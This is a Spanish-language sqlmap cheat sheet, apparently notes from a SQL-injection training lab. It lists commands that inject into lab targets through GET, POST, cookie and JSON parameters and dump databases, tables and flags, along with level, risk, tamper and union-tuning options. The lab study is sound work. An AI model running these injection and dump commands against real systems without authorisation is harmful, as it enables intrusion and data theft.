# SQL Map

## Instalar

```bash
sudo apt install sqlmap
```

## Inyecciones comunes

```
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

-u      especificar el objetivo
--batch no preguntar
```

- Basico

```
sqlmap -u http://157.245.35.236:32257/case1.php\?id\=1 --batch --dump --dbms=MySQL
```

- POST 
```bash
sqlmap -u http://157.245.35.236:32257/case2.php -data 'id=1'  --batch --dump --dbms=MySQL

sqlmap -u http://157.245.35.236:32257/case2.php -data 'id=1'  --batch  --dbms=MySQL -D testdb -T flag2 --dump
```

- Cookie / GET

```
sqlmap -u http://157.245.35.236:32257/case3.php -p id --cookie "id=2; PHPSESSID=sq59lp200emije25tvumh95db5" --dbms="MySQL" --batch --dump --level 2

sqlmap -u http://157.245.35.236:32257/case3.php -p id --cookie "id=2; PHPSESSID=sq59lp200emije25tvumh95db5" --dbms="MySQL" --batch --dump --level 2 -D testdb -T flag3 
```

- Json / POST

```bash
sqlmap -u http://157.245.35.236:30819/case4.php --data='{"id":1}'  --dbms="MySQL" --dump -D testdb -T flag4 -level 1 --batch
```

## Inyecciones a punto

### Listar tampers

```
sqlmap --list-tampers
```
### Prefix/Suffix

```
--prefix  --suffix

sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
sqlmap -u http://138.68.145.250:30427/case6.php\?col\=id --batch --dump -T flag6 --prefix='`)' 
```

### Level / Risk

```
--level     1 a 5 extiende tanto los vectores como los bordes a usar 
--risk      1 a 3 extiende el uso de vectores baso en el riesgo de causar dos

sqlmap -u www.example.com/?id=1 -v 3
sqlmap -u www.example.com/?id=1 -v 3 --level=5
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

### Advanced tunning 

## String

Si una cadena despecifica da resultados TRUE y su ausenca da FALSE se puede usar `--string` para fijar la detección

## Rechniques

Si queremos reducir la cantidad de payloadas a solo algunos tipos, podemos usar `--techniques`


## Union tunning

```
--union-cols

sqlmap -u http://138.68.145.250:30427/case7.php\?id\=1 --batch --dump --union-cols=5 -D testdb -T flag7
```

##  